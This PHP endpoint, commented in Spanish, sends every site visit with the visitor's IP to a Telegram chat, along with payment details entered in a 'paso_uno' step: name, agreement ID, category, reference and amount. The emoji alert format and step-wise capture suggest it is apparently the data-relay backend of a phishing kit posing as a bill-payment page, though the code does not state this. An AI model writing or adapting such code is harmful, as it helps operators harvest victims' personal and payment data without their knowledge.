<?php
/**
 * Endpoint público para registrar eventos y reenviarlos a Telegram.
 * NO imprime credenciales. Recibe JSON por POST.
 */
declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');

// Solo POST
if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'method_not_allowed']);
    exit;
}

require_once __DIR__ . '/config.php';

// Leer payload
$raw = file_get_contents('php://input');
$data = json_decode($raw, true);
if (!is_array($data)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'bad_json']);
    exit;
}

$tipo = $data['tipo'] ?? '';
$ip = obtenerIPCliente();

// Rate limit
if (!rateLimitOK($ip)) {
    http_response_code(429);
    echo json_encode(['ok' => false, 'error' => 'rate_limited']);
    exit;
}

// Sanitizar helper
$limpiar = static function ($v, int $max = 200): string {
    $v = is_scalar($v) ? (string) $v : '';
    $v = trim(preg_replace('/[\x00-\x1F\x7F]/u', '', $v) ?? '');
    if (mb_strlen($v) > $max)
        $v = mb_substr($v, 0, $max);
    return $v;
};

$mensaje = '';

switch ($tipo) {

    case 'visita':
        $pagina = $limpiar($data['pagina'] ?? 'index.php', 120);
        $mensaje = "🟢 *NUEVA VISITA*\n";
        $mensaje .= "📄 Página: " . escaparTelegram("Buscar conjunto ({$pagina})") . "\n";
        $mensaje .= "🌐 IP: " . escaparTelegram($ip);
        break;

    case 'convenio':
        $nombre = $limpiar($data['nombre'] ?? 'desconocido', 180);
        $convenio = $limpiar($data['convenio'] ?? 'N/A', 60);
        $categoria = $limpiar($data['categoria'] ?? 'sin categoría', 120);

        $mensaje = "🔹 *CONVENIO SELECCIONADO*\n";
        $mensaje .= "🔶 Nombre: " . escaparTelegram($nombre) . "\n";
        $mensaje .= "🔑 Convenio: " . escaparTelegram($convenio) . "\n";
        $mensaje .= "🔖 Categoria: " . escaparTelegram($categoria) . "\n";
        $mensaje .= "🌐 IP: " . escaparTelegram($ip);
        break;

    case 'paso_uno':
        $nombre = $limpiar($data['nombre'] ?? 'desconocido', 180);
        $convenioId = $limpiar($data['convenio'] ?? 'N/A', 60);
        $categoria = $limpiar($data['categoria'] ?? 'sin categoría', 120);
        $referencia = $limpiar($data['referencia'] ?? 'vacío', 120);
        $valor = $limpiar($data['valor'] ?? 'vacío', 60);

        $mensaje = "📝 *DATOS DE PAGO INGRESADOS*\n";
        $mensaje .= "🔶 Nombre: " . escaparTelegram($nombre) . "\n";
        $mensaje .= "🔑 Convenio: " . escaparTelegram($convenioId) . "\n";
        $mensaje .= "🔖 Categoria: " . escaparTelegram($categoria) . "\n";
        $mensaje .= "🧾 Referencia: " . escaparTelegram($referencia) . "\n";
        $mensaje .= "💰 Valor: " . escaparTelegram($valor) . "\n";
        $mensaje .= "🌐 IP: " . escaparTelegram($ip);
        break;

    default:
        http_response_code(400);
        echo json_encode(['ok' => false, 'error' => 'tipo_invalido']);
        exit;
}

$ok = enviarTelegram($mensaje);

echo json_encode(['ok' => $ok]);